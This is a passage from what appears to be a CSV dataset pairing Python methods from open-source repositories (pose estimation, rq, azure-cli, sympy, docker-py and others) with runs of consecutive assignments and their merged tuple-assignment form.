                    bottom_joint_index = i
                if joint[1] < top_pos:
                    top_pos = joint[1]
                elif joint[1] > bottom_pos:
                    bottom_pos = joint[1]

                if joint[0] < left_pos:
                    left_pos = joint[0]
                    left_joint_index = i
                elif joint[0] > right_pos:
                    right_pos = joint[0]
                    right_joint_index = i

        top_padding_radio = [0.9, 1.9, 1.9, 2.9, 3.7, 1.9, 2.9, 3.7, 4.0, 5.5, 7.0, 4.0, 5.5, 7.0, 0.7, 0.8, 0.7, 0.8]
        bottom_padding_radio = [6.9, 5.9, 5.9, 4.9, 4.1, 5.9, 4.9, 4.1, 3.8, 2.3, 0.8, 3.8, 2.3, 0.8, 7.1, 7.0, 7.1, 7.0]

        left = (left_pos - 0.3 * unit_length).astype(int)
        right = (right_pos + 0.3 * unit_length).astype(int)
        top = (top_pos - top_padding_radio[top_joint_index] * unit_length).astype(int)
        bottom = (bottom_pos + bottom_padding_radio[bottom_joint_index] * unit_length).astype(int)
        bbox = (left, top, right, bottom)

        cropped_img = self.crop_image(img, bbox)
        return cropped_img, bbox","left = (left_pos - 0.3 * unit_length).astype(int)
right = (right_pos + 0.3 * unit_length).astype(int)
top = (top_pos - top_padding_radio[top_joint_index] * unit_length).astype(int)
bottom = (bottom_pos + bottom_padding_radio[bottom_joint_index] * unit_length).astype(int)","left , right , top , bottom  = (left_pos - 0.3 * unit_length).astype(int), (right_pos + 0.3 * unit_length).astype(int), (top_pos - top_padding_radio[top_joint_index] * unit_length).astype(int), (bottom_pos + bottom_padding_radio[bottom_joint_index] * unit_length).astype(int)"
Chainer_Realtime_Multi-Person_Pose_Estimation,https://github.com/DeNA/Chainer_Realtime_Multi-Person_Pose_Estimation/tree/master//pose_detector.py,PoseDetector,crop_person$311,"def crop_person(self, img, person_pose, unit_length):
        top_joint_priority = [4, 5, 6, 12, 16, 7, 13, 17, 8, 10, 14, 9, 11, 15, 2, 3, 0, 1, sys.maxsize]
        bottom_joint_priority = [9, 6, 7, 14, 16, 8, 15, 17, 4, 2, 0, 5, 3, 1, 10, 11, 12, 13, sys.maxsize]

        top_joint_index = len(top_joint_priority) - 1
        bottom_joint_index = len(bottom_joint_priority) - 1
        left_joint_index = 0
        right_joint_index = 0
        top_pos = sys.maxsize
        bottom_pos = 0
        left_pos = sys.maxsize
        right_pos = 0

        for i, joint in enumerate(person_pose):
            if joint[2] > 0:
                if top_joint_priority[i] < top_joint_priority[top_joint_index]:
                    top_joint_index = i
                elif bottom_joint_priority[i] < bottom_joint_priority[bottom_joint_index]:
                    bottom_joint_index = i
                if joint[1] < top_pos:
                    top_pos = joint[1]
                elif joint[1] > bottom_pos:
                    bottom_pos = joint[1]

                if joint[0] < left_pos:
                    left_pos = joint[0]
                    left_joint_index = i
                elif joint[0] > right_pos:
                    right_pos = joint[0]
                    right_joint_index = i

        top_padding_radio = [0.9, 1.9, 1.9, 2.9, 3.7, 1.9, 2.9, 3.7, 4.0, 5.5, 7.0, 4.0, 5.5, 7.0, 0.7, 0.8, 0.7, 0.8]
        bottom_padding_radio = [6.9, 5.9, 5.9, 4.9, 4.1, 5.9, 4.9, 4.1, 3.8, 2.3, 0.8, 3.8, 2.3, 0.8, 7.1, 7.0, 7.1, 7.0]

        left = (left_pos - 0.3 * unit_length).astype(int)
        right = (right_pos + 0.3 * unit_length).astype(int)
        top = (top_pos - top_padding_radio[top_joint_index] * unit_length).astype(int)
        bottom = (bottom_pos + bottom_padding_radio[bottom_joint_index] * unit_length).astype(int)
        bbox = (left, top, right, bottom)

        cropped_img = self.crop_image(img, bbox)
        return cropped_img, bbox","left_pos = joint[0]
left_joint_index = i","left_pos , left_joint_index  = joint[0], i"
Chainer_Realtime_Multi-Person_Pose_Estimation,https://github.com/DeNA/Chainer_Realtime_Multi-Person_Pose_Estimation/tree/master//pose_detector.py,PoseDetector,crop_person$311,"def crop_person(self, img, person_pose, unit_length):
        top_joint_priority = [4, 5, 6, 12, 16, 7, 13, 17, 8, 10, 14, 9, 11, 15, 2, 3, 0, 1, sys.maxsize]
        bottom_joint_priority = [9, 6, 7, 14, 16, 8, 15, 17, 4, 2, 0, 5, 3, 1, 10, 11, 12, 13, sys.maxsize]

        top_joint_index = len(top_joint_priority) - 1
        bottom_joint_index = len(bottom_joint_priority) - 1
        left_joint_index = 0
        right_joint_index = 0
        top_pos = sys.maxsize
        bottom_pos = 0
        left_pos = sys.maxsize
        right_pos = 0

        for i, joint in enumerate(person_pose):
            if joint[2] > 0:
                if top_joint_priority[i] < top_joint_priority[top_joint_index]:
                    top_joint_index = i
                elif bottom_joint_priority[i] < bottom_joint_priority[bottom_joint_index]:
                    bottom_joint_index = i
                if joint[1] < top_pos:
                    top_pos = joint[1]
                elif joint[1] > bottom_pos:
                    bottom_pos = joint[1]

                if joint[0] < left_pos:
                    left_pos = joint[0]
                    left_joint_index = i
                elif joint[0] > right_pos:
                    right_pos = joint[0]
                    right_joint_index = i

        top_padding_radio = [0.9, 1.9, 1.9, 2.9, 3.7, 1.9, 2.9, 3.7, 4.0, 5.5, 7.0, 4.0, 5.5, 7.0, 0.7, 0.8, 0.7, 0.8]
        bottom_padding_radio = [6.9, 5.9, 5.9, 4.9, 4.1, 5.9, 4.9, 4.1, 3.8, 2.3, 0.8, 3.8, 2.3, 0.8, 7.1, 7.0, 7.1, 7.0]

        left = (left_pos - 0.3 * unit_length).astype(int)
        right = (right_pos + 0.3 * unit_length).astype(int)
        top = (top_pos - top_padding_radio[top_joint_index] * unit_length).astype(int)
        bottom = (bottom_pos + bottom_padding_radio[bottom_joint_index] * unit_length).astype(int)
        bbox = (left, top, right, bottom)

        cropped_img = self.crop_image(img, bbox)
        return cropped_img, bbox","right_pos = joint[0]
right_joint_index = i","right_pos , right_joint_index  = joint[0], i"
rq,https://github.com/rq/rq/tree/master/rq/queue.py,Queue,__init__$73,"def __init__(self, name='default', default_timeout=None, connection: t.Optional['Redis'] = None,
                 is_async=True, job_class=None, serializer=None, **kwargs):
        self.connection = resolve_connection(connection)
        prefix = self.redis_queue_namespace_prefix
        self.name = name
        self._key = '{0}{1}'.format(prefix, name)
        self._default_timeout = parse_timeout(default_timeout) or self.DEFAULT_TIMEOUT
        self._is_async = is_async

        if 'async' in kwargs:
            self._is_async = kwargs['async']
            warnings.warn('The `async` keyword is deprecated. Use `is_async` instead', DeprecationWarning)

        # override class attribute job_class if one was passed
        if job_class is not None:
            if isinstance(job_class, string_types):
                job_class = import_attribute(job_class)
            self.job_class = job_class

        self.serializer = resolve_serializer(serializer)
        self.redis_server_version = None","self.connection = resolve_connection(connection)
prefix = self.redis_queue_namespace_prefix","self.connection , prefix  = resolve_connection(connection), self.redis_queue_namespace_prefix"
rq,https://github.com/rq/rq/tree/master/rq/queue.py,Queue,__init__$73,"def __init__(self, name='default', default_timeout=None, connection: t.Optional['Redis'] = None,
                 is_async=True, job_class=None, serializer=None, **kwargs):
        self.connection = resolve_connection(connection)
        prefix = self.redis_queue_namespace_prefix
        self.name = name
        self._key = '{0}{1}'.format(prefix, name)
        self._default_timeout = parse_timeout(default_timeout) or self.DEFAULT_TIMEOUT
        self._is_async = is_async

        if 'async' in kwargs:
            self._is_async = kwargs['async']
            warnings.warn('The `async` keyword is deprecated. Use `is_async` instead', DeprecationWarning)

        # override class attribute job_class if one was passed
        if job_class is not None:
            if isinstance(job_class, string_types):
                job_class = import_attribute(job_class)
            self.job_class = job_class

        self.serializer = resolve_serializer(serializer)
        self.redis_server_version = None","self.name = name
self._key = '{0}{1}'.format(prefix, name)","self.name , self._key  = name, '{0}{1}'.format(prefix, name)"
rq,https://github.com/rq/rq/tree/master/rq/queue.py,Queue,__init__$73,"def __init__(self, name='default', default_timeout=None, connection: t.Optional['Redis'] = None,
                 is_async=True, job_class=None, serializer=None, **kwargs):
        self.connection = resolve_connection(connection)
        prefix = self.redis_queue_namespace_prefix
        self.name = name
        self._key = '{0}{1}'.format(prefix, name)
        self._default_timeout = parse_timeout(default_timeout) or self.DEFAULT_TIMEOUT
        self._is_async = is_async

        if 'async' in kwargs:
            self._is_async = kwargs['async']
            warnings.warn('The `async` keyword is deprecated. Use `is_async` instead', DeprecationWarning)

        # override class attribute job_class if one was passed
        if job_class is not None:
            if isinstance(job_class, string_types):
                job_class = import_attribute(job_class)
            self.job_class = job_class

        self.serializer = resolve_serializer(serializer)
        self.redis_server_version = None","self._default_timeout = parse_timeout(default_timeout) or self.DEFAULT_TIMEOUT
self._is_async = is_async","self._default_timeout , self._is_async  = parse_timeout(default_timeout) or self.DEFAULT_TIMEOUT, is_async"
rq,https://github.com/rq/rq/tree/master/rq/queue.py,Queue,__init__$73,"def __init__(self, name='default', default_timeout=None, connection: t.Optional['Redis'] = None,
                 is_async=True, job_class=None, serializer=None, **kwargs):
        self.connection = resolve_connection(connection)
        prefix = self.redis_queue_namespace_prefix
        self.name = name
        self._key = '{0}{1}'.format(prefix, name)
        self._default_timeout = parse_timeout(default_timeout) or self.DEFAULT_TIMEOUT
        self._is_async = is_async

        if 'async' in kwargs:
            self._is_async = kwargs['async']
            warnings.warn('The `async` keyword is deprecated. Use `is_async` instead', DeprecationWarning)

        # override class attribute job_class if one was passed
        if job_class is not None:
            if isinstance(job_class, string_types):
                job_class = import_attribute(job_class)
            self.job_class = job_class

        self.serializer = resolve_serializer(serializer)
        self.redis_server_version = None","self.serializer = resolve_serializer(serializer)
self.redis_server_version = None","self.serializer , self.redis_server_version  = resolve_serializer(serializer), None"
azure-cli,https://github.com/Azure/azure-cli/tree/master/src/azure-cli-core/azure/cli/core/commands/command_operation.py,GenericUpdateCommandOperation,_extract_op_handler_and_args$260,"def _extract_op_handler_and_args(self, args, op_path):
        from azure.cli.core.commands.arm import EXCLUDED_NON_CLIENT_PARAMS

        client = None
        if self.client_factory:
            try:
                client = self.client_factory(self.cli_ctx)
            except TypeError:
                client = self.client_factory(self.cli_ctx, args)

        client_arg_name = self.resolve_client_arg_name(op_path)
        op = self.get_op_handler(op_path)
        raw_args = dict(extract_args_from_signature(op, excluded_params=EXCLUDED_NON_CLIENT_PARAMS))
        op_args = {key: val for key, val in args.items() if key in raw_args}
        if client_arg_name in raw_args:
            op_args[client_arg_name] = client
        return op, op_args","client_arg_name = self.resolve_client_arg_name(op_path)
op = self.get_op_handler(op_path)","client_arg_name , op  = self.resolve_client_arg_name(op_path), self.get_op_handler(op_path)"
dulwich,https://github.com/dulwich/dulwich/tree/master/dulwich/tests/test_objects.py,TreeTests,test_add$836,"def test_add(self):
        myhexsha = b""d80c186a03f423a81b39df39dc87fd269736ca86""
        x = Tree()
        x.add(b""myname"", 0o100755, myhexsha)
        self.assertEqual(x[b""myname""], (0o100755, myhexsha))
        self.assertEqual(b""100755 myname\0"" + hex_to_sha(myhexsha), x.as_raw_string())","myhexsha = b'd80c186a03f423a81b39df39dc87fd269736ca86'
x = Tree()","myhexsha , x  = b'd80c186a03f423a81b39df39dc87fd269736ca86', Tree()"
tf-quant-finance,https://github.com/google/tf-quant-finance/tree/master/tf_quant_finance/datetime/holiday_calendar_test.py,HolidayCalendarTest,test_add_business_days_raises_on_invalid_input$197,"def test_add_business_days_raises_on_invalid_input(self):
    data = test_data.add_days_data  # Contains some holidays.
    date_tensor = dates.dates_from_tuples([item[""date""] for item in data])
    days = tf.constant([item[""days""] for item in data])
    cal = self.impl(
        weekend_mask=dates.WeekendMask.SATURDAY_SUNDAY,
        holidays=test_data.holidays)
    with self.assertRaises(tf.errors.InvalidArgumentError):
      new_dates = cal.add_business_days(
          date_tensor, days,
          roll_convention=dates.BusinessDayConvention.NONE)
      self.evaluate(new_dates.ordinal())","date_tensor = dates.dates_from_tuples([item['date'] for item in data])
days = tf.constant([item['days'] for item in data])
cal = self.impl(weekend_mask=dates.WeekendMask.SATURDAY_SUNDAY, holidays=test_data.holidays)","date_tensor , days , cal  = dates.dates_from_tuples([item['date'] for item in data]), tf.constant([item['days'] for item in data]), self.impl(weekend_mask=dates.WeekendMask.SATURDAY_SUNDAY, holidays=test_data.holidays)"
mmgeneration,https://github.com/open-mmlab/mmgeneration/tree/master/mmgen/models/architectures/biggan/modules.py,BigGANGenResBlock,forward$162,"def forward(self, x, y):
        """"""Forward function.

        Args:
            x (torch.Tensor): Input feature map tensor.
            y (torch.Tensor): Label tensor or class embedding concatenated with
                noise tensor.

        Returns:
            torch.Tensor: Output feature map tensor.
        """"""
        x0 = self.bn1(x, y)
        x0 = self.activation(x0)
        if self.with_upsample:
            x0 = self.upsample_layer(x0)
            x = self.upsample_layer(x)
        x0 = self.conv1(x0)
        x0 = self.bn2(x0, y)
        x0 = self.activation(x0)
        x0 = self.conv2(x0)
        if self.learnable_sc:
            x = self.shortcut(x)
        return x0 + x","x0 = self.upsample_layer(x0)
x = self.upsample_layer(x)","x0 , x  = self.upsample_layer(x0), self.upsample_layer(x)"
sympy,https://github.com/sympy/sympy/tree/master/sympy/sets/tests/test_fancysets.py,,test_ComplexRegion_union$1012,"def test_ComplexRegion_union():
    # Polar form
    c1 = ComplexRegion(Interval(0, 1)*Interval(0, 2*S.Pi), polar=True)
    c2 = ComplexRegion(Interval(0, 1)*Interval(0, S.Pi), polar=True)
    c3 = ComplexRegion(Interval(0, oo)*Interval(0, S.Pi), polar=True)
    c4 = ComplexRegion(Interval(0, oo)*Interval(S.Pi, 2*S.Pi), polar=True)

    p1 = Union(Interval(0, 1)*Interval(0, 2*S.Pi), Interval(0, 1)*Interval(0, S.Pi))
    p2 = Union(Interval(0, oo)*Interval(0, S.Pi), Interval(0, oo)*Interval(S.Pi, 2*S.Pi))

    assert c1.union(c2) == ComplexRegion(p1, polar=True)
    assert c3.union(c4) == ComplexRegion(p2, polar=True)

    # Rectangular form
    c5 = ComplexRegion(Interval(2, 5)*Interval(6, 9))
    c6 = ComplexRegion(Interval(4, 6)*Interval(10, 12))
    c7 = ComplexRegion(Interval(0, 10)*Interval(-10, 0))
    c8 = ComplexRegion(Interval(12, 16)*Interval(14, 20))

    p3 = Union(Interval(2, 5)*Interval(6, 9), Interval(4, 6)*Interval(10, 12))
    p4 = Union(Interval(0, 10)*Interval(-10, 0), Interval(12, 16)*Interval(14, 20))

    assert c5.union(c6) == ComplexRegion(p3)
    assert c7.union(c8) == ComplexRegion(p4)

    assert c1.union(Interval(2, 4)) == Union(c1, Interval(2, 4), evaluate=False)
    assert c5.union(Interval(2, 4)) == Union(c5, ComplexRegion.from_real(Interval(2, 4)))","c1 = ComplexRegion(Interval(0, 1) * Interval(0, 2 * S.Pi), polar=True)
c2 = ComplexRegion(Interval(0, 1) * Interval(0, S.Pi), polar=True)
c3 = ComplexRegion(Interval(0, oo) * Interval(0, S.Pi), polar=True)
c4 = ComplexRegion(Interval(0, oo) * Interval(S.Pi, 2 * S.Pi), polar=True)
p1 = Union(Interval(0, 1) * Interval(0, 2 * S.Pi), Interval(0, 1) * Interval(0, S.Pi))
p2 = Union(Interval(0, oo) * Interval(0, S.Pi), Interval(0, oo) * Interval(S.Pi, 2 * S.Pi))","c1 , c2 , c3 , c4 , p1 , p2  = ComplexRegion(Interval(0, 1) * Interval(0, 2 * S.Pi), polar=True), ComplexRegion(Interval(0, 1) * Interval(0, S.Pi), polar=True), ComplexRegion(Interval(0, oo) * Interval(0, S.Pi), polar=True), ComplexRegion(Interval(0, oo) * Interval(S.Pi, 2 * S.Pi), polar=True), Union(Interval(0, 1) * Interval(0, 2 * S.Pi), Interval(0, 1) * Interval(0, S.Pi)), Union(Interval(0, oo) * Interval(0, S.Pi), Interval(0, oo) * Interval(S.Pi, 2 * S.Pi))"
sympy,https://github.com/sympy/sympy/tree/master/sympy/sets/tests/test_fancysets.py,,test_ComplexRegion_union$1012,"def test_ComplexRegion_union():
    # Polar form
    c1 = ComplexRegion(Interval(0, 1)*Interval(0, 2*S.Pi), polar=True)
    c2 = ComplexRegion(Interval(0, 1)*Interval(0, S.Pi), polar=True)
    c3 = ComplexRegion(Interval(0, oo)*Interval(0, S.Pi), polar=True)
    c4 = ComplexRegion(Interval(0, oo)*Interval(S.Pi, 2*S.Pi), polar=True)

    p1 = Union(Interval(0, 1)*Interval(0, 2*S.Pi), Interval(0, 1)*Interval(0, S.Pi))
    p2 = Union(Interval(0, oo)*Interval(0, S.Pi), Interval(0, oo)*Interval(S.Pi, 2*S.Pi))

    assert c1.union(c2) == ComplexRegion(p1, polar=True)
    assert c3.union(c4) == ComplexRegion(p2, polar=True)

    # Rectangular form
    c5 = ComplexRegion(Interval(2, 5)*Interval(6, 9))
    c6 = ComplexRegion(Interval(4, 6)*Interval(10, 12))
    c7 = ComplexRegion(Interval(0, 10)*Interval(-10, 0))
    c8 = ComplexRegion(Interval(12, 16)*Interval(14, 20))

    p3 = Union(Interval(2, 5)*Interval(6, 9), Interval(4, 6)*Interval(10, 12))
    p4 = Union(Interval(0, 10)*Interval(-10, 0), Interval(12, 16)*Interval(14, 20))

    assert c5.union(c6) == ComplexRegion(p3)
    assert c7.union(c8) == ComplexRegion(p4)

    assert c1.union(Interval(2, 4)) == Union(c1, Interval(2, 4), evaluate=False)
    assert c5.union(Interval(2, 4)) == Union(c5, ComplexRegion.from_real(Interval(2, 4)))","c5 = ComplexRegion(Interval(2, 5) * Interval(6, 9))
c6 = ComplexRegion(Interval(4, 6) * Interval(10, 12))
c7 = ComplexRegion(Interval(0, 10) * Interval(-10, 0))
c8 = ComplexRegion(Interval(12, 16) * Interval(14, 20))
p3 = Union(Interval(2, 5) * Interval(6, 9), Interval(4, 6) * Interval(10, 12))
p4 = Union(Interval(0, 10) * Interval(-10, 0), Interval(12, 16) * Interval(14, 20))","c5 , c6 , c7 , c8 , p3 , p4  = ComplexRegion(Interval(2, 5) * Interval(6, 9)), ComplexRegion(Interval(4, 6) * Interval(10, 12)), ComplexRegion(Interval(0, 10) * Interval(-10, 0)), ComplexRegion(Interval(12, 16) * Interval(14, 20)), Union(Interval(2, 5) * Interval(6, 9), Interval(4, 6) * Interval(10, 12)), Union(Interval(0, 10) * Interval(-10, 0), Interval(12, 16) * Interval(14, 20))"
MobileStyleGAN.pytorch,https://github.com/bes-dev/MobileStyleGAN.pytorch/tree/master/core/models/modules/ops/fused_act_cuda.py,FusedLeakyReLUFunctionBackward,forward$19,"def forward(ctx, grad_output, out, negative_slope, scale):
        ctx.save_for_backward(out)
        ctx.negative_slope = negative_slope
        ctx.scale = scale

        empty = grad_output.new_empty(0)

        grad_input = fused.fused_bias_act(
            grad_output, empty, out, 3, 1, negative_slope, scale
        )

        dim = [0]

        if grad_input.ndim > 2:
            dim += list(range(2, grad_input.ndim))

        grad_bias = grad_input.sum(dim).detach()

        return grad_input, grad_bias","ctx.negative_slope = negative_slope
ctx.scale = scale
empty = grad_output.new_empty(0)","ctx.negative_slope , ctx.scale , empty  = negative_slope, scale, grad_output.new_empty(0)"
MobileStyleGAN.pytorch,https://github.com/bes-dev/MobileStyleGAN.pytorch/tree/master/core/models/modules/ops/fused_act_cuda.py,FusedLeakyReLUFunctionBackward,forward$19,"def forward(ctx, grad_output, out, negative_slope, scale):
        ctx.save_for_backward(out)
        ctx.negative_slope = negative_slope
        ctx.scale = scale

        empty = grad_output.new_empty(0)

        grad_input = fused.fused_bias_act(
            grad_output, empty, out, 3, 1, negative_slope, scale
        )

        dim = [0]

        if grad_input.ndim > 2:
            dim += list(range(2, grad_input.ndim))

        grad_bias = grad_input.sum(dim).detach()

        return grad_input, grad_bias","grad_input = fused.fused_bias_act(grad_output, empty, out, 3, 1, negative_slope, scale)
dim = [0]","grad_input , dim  = fused.fused_bias_act(grad_output, empty, out, 3, 1, negative_slope, scale), [0]"
addons-server,https://github.com/mozilla/addons-server/tree/master/src/olympia/users/tests/test_admin.py,TestUserAdmin,test_last_known_activity_time$864,"def test_last_known_activity_time(self):
        someone_else = user_factory(username='someone_else')
        addon = addon_factory()

        model_admin = UserAdmin(UserProfile, admin.site)
        assert str(model_admin.last_known_activity_time(self.user)) == ''

        # Add various activities. They will be attached to whatever user is
        # set in the thread global at the time, so set that in advance.
        core.set_user(self.user)
        expected_date = self.days_ago(1)
        activity = ActivityLog.create(amo.LOG.CREATE_ADDON, addon)
        activity.update(created=self.days_ago(2))

        activity = ActivityLog.create(amo.LOG.EDIT_PROPERTIES, addon)
        activity.update(created=expected_date)

        assert activity.reload().created == expected_date

        # Create another activity, more recent, attached to a different user.
        core.set_user(someone_else)
        activity = ActivityLog.create(amo.LOG.EDIT_PROPERTIES, addon)

        expected_result = localize(expected_date)

        assert str(model_admin.last_known_activity_time(self.user)) == expected_result","someone_else = user_factory(username='someone_else')
addon = addon_factory()
model_admin = UserAdmin(UserProfile, admin.site)","someone_else , addon , model_admin  = user_factory(username='someone_else'), addon_factory(), UserAdmin(UserProfile, admin.site)"
addons-server,https://github.com/mozilla/addons-server/tree/master/src/olympia/users/tests/test_admin.py,TestUserAdmin,test_last_known_activity_time$864,"def test_last_known_activity_time(self):
        someone_else = user_factory(username='someone_else')
        addon = addon_factory()

        model_admin = UserAdmin(UserProfile, admin.site)
        assert str(model_admin.last_known_activity_time(self.user)) == ''

        # Add various activities. They will be attached to whatever user is
        # set in the thread global at the time, so set that in advance.
        core.set_user(self.user)
        expected_date = self.days_ago(1)
        activity = ActivityLog.create(amo.LOG.CREATE_ADDON, addon)
        activity.update(created=self.days_ago(2))

        activity = ActivityLog.create(amo.LOG.EDIT_PROPERTIES, addon)
        activity.update(created=expected_date)

        assert activity.reload().created == expected_date

        # Create another activity, more recent, attached to a different user.
        core.set_user(someone_else)
        activity = ActivityLog.create(amo.LOG.EDIT_PROPERTIES, addon)

        expected_result = localize(expected_date)

        assert str(model_admin.last_known_activity_time(self.user)) == expected_result","expected_date = self.days_ago(1)
activity = ActivityLog.create(amo.LOG.CREATE_ADDON, addon)","expected_date , activity  = self.days_ago(1), ActivityLog.create(amo.LOG.CREATE_ADDON, addon)"
addons-server,https://github.com/mozilla/addons-server/tree/master/src/olympia/users/tests/test_admin.py,TestUserAdmin,test_last_known_activity_time$864,"def test_last_known_activity_time(self):
        someone_else = user_factory(username='someone_else')
        addon = addon_factory()

        model_admin = UserAdmin(UserProfile, admin.site)
        assert str(model_admin.last_known_activity_time(self.user)) == ''

        # Add various activities. They will be attached to whatever user is
        # set in the thread global at the time, so set that in advance.
        core.set_user(self.user)
        expected_date = self.days_ago(1)
        activity = ActivityLog.create(amo.LOG.CREATE_ADDON, addon)
        activity.update(created=self.days_ago(2))

        activity = ActivityLog.create(amo.LOG.EDIT_PROPERTIES, addon)
        activity.update(created=expected_date)

        assert activity.reload().created == expected_date

        # Create another activity, more recent, attached to a different user.
        core.set_user(someone_else)
        activity = ActivityLog.create(amo.LOG.EDIT_PROPERTIES, addon)

        expected_result = localize(expected_date)

        assert str(model_admin.last_known_activity_time(self.user)) == expected_result","activity = ActivityLog.create(amo.LOG.EDIT_PROPERTIES, addon)
expected_result = localize(expected_date)","activity , expected_result  = ActivityLog.create(amo.LOG.EDIT_PROPERTIES, addon), localize(expected_date)"
jenkins-attack-framework,https://github.com/Accenture/jenkins-attack-framework/tree/master/tests/test_AccessCheck.py,AccessCheckParserTest,setUp$135,"def setUp(self):
        self.testcommand = ""AccessCheck""
        self.TestClass = AccessCheck
        self.TestParserClass = AccessCheckParser","self.testcommand = 'AccessCheck'
self.TestClass = AccessCheck
self.TestParserClass = AccessCheckParser","self.testcommand , self.TestClass , self.TestParserClass  = 'AccessCheck', AccessCheck, AccessCheckParser"
Packer-Fuzzer,https://github.com/rtcatc/Packer-Fuzzer/tree/master/lib/CreateReport.py,CreateReport,create_repoter$24,"def create_repoter(self):
        main_url = DatabaseType(self.projectTag).getURLfromDB()
        parse_url = urlparse(main_url)
        host = parse_url.netloc.replace(':', '_') #win can not deal : in filename
        reportType = CommandLines().cmd().report
        reportTypes = reportType.split(',')
        if ""doc"" in reportTypes or ""pdf"" in reportTypes or ""txt"" in reportTypes or ""html"" in reportTypes:
            self.log.info(Utils().tellTime() + Utils().getMyWord(""{report_creat}""))
        if ""html"" in reportTypes:
            if CommandLines().cmd().silent != None:
                nameHtml = ""reports"" + os.sep + CommandLines().cmd().silent + "".html""
            else:
                nameHtml = ""reports"" + os.sep + host + ""-"" + self.projectTag + "".html""
            if os.path.exists(""reports"" + os.sep + ""res""):
                pass
            else:
                Utils().copyPath(""doc"" + os.sep + ""template"" + os.sep + ""html"" + os.sep + ""res"",""reports"")
            try:
                CreatHtml(self.projectTag,nameHtml).CreatMe()
                self.log.debug(""html模板正常"")
            except Exception as e:
                self.log.error(""[Err] %s"" % e)
        if ""doc"" in reportTypes or ""pdf"" in reportTypes or ""txt"" in reportTypes:
            Docx_replace(self.projectTag).mainReplace()
            if ""doc"" in reportTypes:
                if CommandLines().cmd().silent != None:
                    nameDoc = ""reports"" + os.sep + CommandLines().cmd().silent + "".docx""
                else:
                    nameDoc = ""reports"" + os.sep + host + ""-"" + self.projectTag + "".docx""
                Docx_replace(self.projectTag).docMove(nameDoc)
            if ""txt"" in reportTypes:
                if CommandLines().cmd().silent != None:
                    nameTxt = ""reports"" + os.sep + CommandLines().cmd().silent + "".txt""
                else:
                    nameTxt = ""reports"" + os.sep + host + ""-"" + self.projectTag + "".txt""
                CreatTxt(self.projectTag,nameTxt).CreatMe()
            if ""pdf"" in reportTypes:
                if CommandLines().cmd().silent != None:
                    namePdf =  ""reports"" + os.sep + CommandLines().cmd().silent + "".pdf""
                else:
                    namePdf = ""reports"" + os.sep + host + ""-"" + self.projectTag + "".pdf""
                CreatPdf(self.projectTag,namePdf).CreatMe()
            Docx_replace(self.projectTag).docDel()
        if ""doc"" in reportTypes or ""pdf"" in reportTypes or ""txt"" in reportTypes or ""html"" in reportTypes:
            time.sleep(2) #waiting
            self.log.info(Utils().tellTime() + Utils().getMyWord(""{report_fini}""))","host = parse_url.netloc.replace(':', '_')
reportType = CommandLines().cmd().report","host , reportType  = parse_url.netloc.replace(':', '_'), CommandLines().cmd().report"
fairlearn,https://github.com/fairlearn/fairlearn/tree/master/test/unit/metrics/test_metricframe_aggregates.py,Test2m1sf1cfErrorHandlingCM,test_max_coerce$1095,"def test_max_coerce(self):
        self._prepare()
        target_maxs = self.target.group_max(errors='coerce')
        expected_maxs = self.expected.group_max()
        expected_maxs['confusion_matrix'] = np.nan
        assert target_maxs.equals(expected_maxs)","target_maxs = self.target.group_max(errors='coerce')
expected_maxs = self.expected.group_max()","target_maxs , expected_maxs  = self.target.group_max(errors='coerce'), self.expected.group_max()"
docker-py,https://github.com/docker/docker-py/tree/master/tests/integration/api_build_test.py,BuildTest,test_build_in_context_nested_dockerfile$516,"def test_build_in_context_nested_dockerfile(self):
        base_dir = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, base_dir)
        with open(os.path.join(base_dir, 'file.txt'), 'w') as f:
            f.write('hello world')
        subdir = os.path.join(base_dir, 'hello', 'world')
        os.makedirs(subdir)
        with open(os.path.join(subdir, 'custom.dockerfile'), 'w') as df:
            df.write('\n'.join([
                'FROM busybox',
                'COPY . /src',
                'WORKDIR /src',
            ]))
        img_name = random_name()
        self.tmp_imgs.append(img_name)
        stream = self.client.build(
            path=base_dir, dockerfile='hello/world/custom.dockerfile',
            tag=img_name, decode=True
        )
        lines = []
        for chunk in stream:
            lines.append(chunk)
        assert 'Successfully tagged' in lines[-1]['stream']

        ctnr = self.client.create_container(img_name, 'ls -a')
        self.tmp_containers.append(ctnr)
        self.client.start(ctnr)
        lsdata = self.client.logs(ctnr).strip().split(b'\n')
        assert len(lsdata) == 4
        assert sorted(
            [b'.', b'..', b'file.txt', b'hello']
        ) == sorted(lsdata)","stream = self.client.build(path=base_dir, dockerfile='hello/world/custom.dockerfile', tag=img_name, decode=True)
lines = []","stream , lines  = self.client.build(path=base_dir, dockerfile='hello/world/custom.dockerfile', tag=img_name, decode=True), []"
ShivyC,https://github.com/ShivamSarodia/ShivyC/tree/master/shivyc/tree/decl_nodes.py,_StructUnion,__init__$121,"def __init__(self, tag, members, r):
        self.tag = tag
        self.members = members

        # These r and kind members are a little hacky. They allow the
        # make_specs_ctype function in tree.nodes.Declaration to treat this
        # as a Token for the purposes of determining the base type of the
        # declaration.
        self.r = r

        super().__init__()","self.tag = tag
self.members = members
self.r = r","self.tag , self.members , self.r  = tag, members, r"
shuup,https://github.com/shuup/shuup/tree/master/shuup/front/checkout/methods.py,MethodsPhase,process$121,"def process(self):
        shipping_method = ShippingMethod.objects.filter(pk=self.storage.get(""shipping_method_id"")).first()
        payment_method = PaymentMethod.objects.filter(pk=self.storage.get(""payment_method_id"")).first()

        self.basket.shipping_method = shipping_method if shipping_method else None
        self.basket.payment_method = payment_method if payment_method else None

        # force recalculate lines
        self.basket.uncache()","self.basket.shipping_method = shipping_method if shipping_method else None
self.basket.payment_method = payment_method if payment_method else None","self.basket.shipping_method , self.basket.payment_method  = shipping_method if shipping_method else None, payment_method if payment_method else None"
python-mss,https://github.com/BoboTiG/python-mss/tree/master/mss/linux.py,MSS,_monitors_impl$385,"def _monitors_impl(self) -> None:
        """"""Get positions of monitors. It will populate self._monitors.""""""

        display = self._get_display()
        int_ = int
        xrandr = self.xrandr

        # All monitors
        gwa = XWindowAttributes()
        self.xlib.XGetWindowAttributes(display, self.root, ctypes.byref(gwa))
        self._monitors.append(
            {
                ""left"": int_(gwa.x),
                ""top"": int_(gwa.y),
                ""width"": int_(gwa.width),
                ""height"": int_(gwa.height),
            }
        )

        # Each monitor
        # A simple benchmark calling 10 times those 2 functions:
        # XRRGetScreenResources():        0.1755971429956844 s
        # XRRGetScreenResourcesCurrent(): 0.0039125580078689 s
        # The second is faster by a factor of 44! So try to use it first.
        try:
            mon = xrandr.XRRGetScreenResourcesCurrent(display, self.drawable).contents
        except AttributeError:
